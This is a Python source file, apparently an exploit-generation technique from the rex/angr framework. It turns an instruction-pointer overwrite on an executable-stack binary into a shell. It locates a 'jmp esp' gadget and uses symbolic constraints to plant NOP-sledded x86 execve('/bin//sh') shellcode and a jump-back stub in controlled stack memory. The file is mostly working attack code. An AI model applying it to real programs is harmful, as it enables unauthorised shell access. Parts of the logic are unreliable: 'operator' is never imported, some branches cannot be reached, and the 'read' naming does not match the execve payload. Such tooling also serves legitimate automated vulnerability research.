import logging
from pwn import *
import struct
from rex import Vulnerability
from rex.exploit import Exploit, CannotExploit, NoSuchShellcode
from ..technique import Technique
import copy

l = logging.getLogger("rex.exploit.techniques.CallJmpSPShellcode_unix_read")

class CallJmpSPShellcode_unix_read(Technique):

    name = "READ"

    applicable_to = ['unix']

    def apply(self, **kwargs):

        # can only exploit ip overwrites
        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            raise CannotExploit("[%s] cannot control ip" % self.name)

        if not self.crash.project.loader.main_bin.execstack:
            raise CannotExploit("[%s] stack is not executable" % self.name)
        


        #read_addr = kwargs['read_addr']
        """
            Shellcode from S2E
        """
        #exploitReadShellCode_start = "\xeb\x03\x59\xeb\x0e\xe8\xf8\xff\xff\xff\x5b\x52\x65\x73\x75\x6c\x74\x5d\x3a\x31\xc0\x83\xc0\x04\x31\xdb\x43\x89\xc2\x83\xc2\x05\xcd\x80\x31\xc0\x83\xc0\x04\x31\xdb\x43\xb9"
        #exploitReadShellCode_end   = "\x89\xc2\xcd\x80\xc3"
        #ReadShellCode_real_len = 0x34
        #shellcode_read = exploitReadShellCode_start + struct.pack('I',int(read_addr,16)) + exploitReadShellCode_end
        shellcode_read = '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
        read_shellcode_len = len(shellcode_read)
        exploitWriteShellCode_one = "\xbb" # + exploitWriteShellCodeAddr
        exploitWriteShellCode_two = "\xc7\x03" # + exploitWriteShellCodeValue
        WriteShellCode_three = "\xc3"
        exploitWriteShellCode_real_len = 0xc     
        nop_asm = '\x90'
        
        # use pwntool find jmp esp
        try:
            binary = ELF(self.crash.project.filename)
            jmp_esp = asm('jmp esp')
            jmp_esp_addr = binary.search(jmp_esp).next()   
            if jmp_esp_addr is not None:
                pass
            else:
                # if there's no jmp esp, then exit
                exit(0)   
        except:
            # we are in a thread, just exit, it's fine
            exit(0)  
        memory_control = self.crash.symbolic_mem
        largest_regions = sorted(memory_control.items(),key=operator.itemgetter(1),reverse=True)        
        for region in largest_regions:
            if region[0] > self.crash.state.se.any_int(self.crash.state.regs.esp): #controled region is under esp!
                if region[0] == self.crash.state.se.any_int(self.crash.state.regs.esp) + 4:#controled region is start at esp + 4
                    if region[1] > read_shellcode_len: #region can contain shellcode,then we will choose `jmp esp` way!                      
                        self.crash.state.add_constraints(self.crash.state.ip == jmp_esp_addr)  # add the constraint that the ip must point at the 'jmp sp' stub                      
                        free_space = region[1] - read_shellcode_len
                        shellcode_read = nop_asm * (free_space-1) + shellcode_read
                        read_shellcode_len = len(shellcode_read)
                        shc_constraint = self.crash.state.memory.load(region[0], read_shellcode_len) == self.crash.state.se.BVV(shellcode_read)
                        if self.crash.state.se.satisfiable(extra_constraints=(shc_constraint,)):
                            self.crash.state.add_constraints(shc_constraint)  
                        if not self.crash.state.satisfiable():
                            raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)                        
        
                        
            else: #controled region is above esp!
                """
                prepare jmp_back code
                """
                
                diff_addr = self.crash.state.se.any_int(self.crash.state.regs.esp) - region[0] - 4 #diff_addr stand the space of memory can be filled with shellcode
                diff_addr = min(diff_addr,128) # short jmp can only jmp 128 byte
                if diff_addr == 128:
                    #self.crash.state.add_constraints(self.crash.state.ip == jmp_esp_addr)
                    #obviously, if we can't jmp esp, we can't jmp back later!
                    constant_jmpesp = self.crash.state.memory.load(self.crash.state.regs.esp - 4,4) == self.crash.state.se.BVV(struct.pack('I',jmp_esp_addr))
                    self.crash.state.add_constraints(constant_jmpesp)
                    if not self.crash.state.satisfiable():
                        raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name) 
                    
                    offset = 0 #used for search!
                    target_addr = self.crash.state.se.any_int(self.crash.state.regs.sp) - 128 #we begain to try to write shellcode at esp-128
                    for addr in range(target_addr,target_addr + (128 - 4 - read_shellcode_len)):   #esp - 4 was filled with 'jmp esp', so mustn't be overwrite!                 
                        shc_constraint = self.crash.state.memory.load(addr, len(shellcode_read)) == self.crash.state.se.BVV(shellcode_read)
                        if self.crash.state.se.satisfiable(extra_constraints=(shc_constraint,)):
                            self.crash.state.add_constraints(shc_constraint)
                            #prepare for jmp back !
                            jmp_offset_plus_4 = 'jmp $-' + str(128 - offset) #jmp to esp - 128, and then try to jmp to esp - 127 and so on
                            jmp_offset_plus_4 = asm(jmp_offset_plus_4)
                            jmp_back_len = len(jmp_offset_plus_4)                            
                            
                            constant_jmpback = self.crash.state.memory.load(self.crash.state.regs.esp,jmp_back_len) == self.crash.state.se.BVV(jmp_offset_plus_4)
                            if self.crash.state.se.satisfiable(extra_constraints=(constant_jmpback,)):
                                self.crash.state.add_constraints(constant_jmpback)                            
                                break
                            else:
                                offset += 1 #we try to write shellcode to next address of esp - 128!
                                   
                if not self.crash.state.satisfiable():
                    raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)                  
                if self.crash.state.satisfiable():
                    break                       
                    
                     
                                          
            
                if diff_addr >= len(shellcode_read):  
                    constant_jmpesp = self.crash.state.memory.load(self.crash.state.regs.esp - 4,4) == self.crash.state.se.BVV(struct.pack('I',jmp_esp_addr))
                    self.crash.state.add_constraints(constant_jmpesp)
                    if not self.crash.state.satisfiable():
                        raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name) 
                    
                    offset = 0 #used for search!
                    target_addr = region[0] #we begain to try to write shellcode at the beginning of symbolic memory
                    for addr in range(target_addr,target_addr + (diff_addr - read_shellcode_len)):   #esp - 4 was filled with 'jmp esp', so mustn't be overwrite!                 
                        shc_constraint = self.crash.state.memory.load(addr, len(shellcode_read)) == self.crash.state.se.BVV(shellcode_read)
                        if self.crash.state.se.satisfiable(extra_constraints=(shc_constraint,)):
                            self.crash.state.add_constraints(shc_constraint)
                            #prepare for jmp back !
                            jmp_back_distance = self.crash.state.se.any_int(self.crash.state.regs.esp) - region[0]
                            jmp_offset_plus_4 = 'jmp $-' + str(jmp_back_distance - offset) #jmp to esp - 128, and then try to jmp to esp - 127 and so on
                            jmp_offset_plus_4 = asm(jmp_offset_plus_4)
                            jmp_back_len = len(jmp_offset_plus_4)                            
                            
                            constant_jmpback = self.crash.state.memory.load(self.crash.state.regs.esp,jmp_back_len) == self.crash.state.se.BVV(jmp_offset_plus_4)
                            if self.crash.state.se.satisfiable(extra_constraints=(constant_jmpback,)):
                                self.crash.state.add_constraints(constant_jmpback)                            
                                break
                            else:
                                offset += 1 #we try to write shellcode to next address of esp - 128!
                    if not self.crash.state.satisfiable():
                        raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)                  
                    if self.crash.state.satisfiable():
                        break
                else:
                    constant_jmpesp = self.crash.state.memory.load(self.crash.state.regs.esp - 4,4) == self.crash.state.se.BVV(struct.pack('I',jmp_esp_addr))
                    self.crash.state.add_constraints(constant_jmpesp)                    

                    for addr in range(self.crash.state.se.any_int(self.crash.state.regs.esp),region[0]+region[1]):                    
                        shc_constraint = self.crash.state.memory.load(addr, len(shellcode_read)) == self.crash.state.se.BVV(shellcode_read)
                        if self.crash.state.se.satisfiable(extra_constraints=(shc_constraint,)):
                            self.crash.state.add_constraints(shc_constraint)
                            break
                    if not self.crash.state.satisfiable():
                        raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)                  
                    if self.crash.state.satisfiable():
                        break                    
       
        
        return Exploit(self.crash, bypasses_nx=False, bypasses_aslr=True)
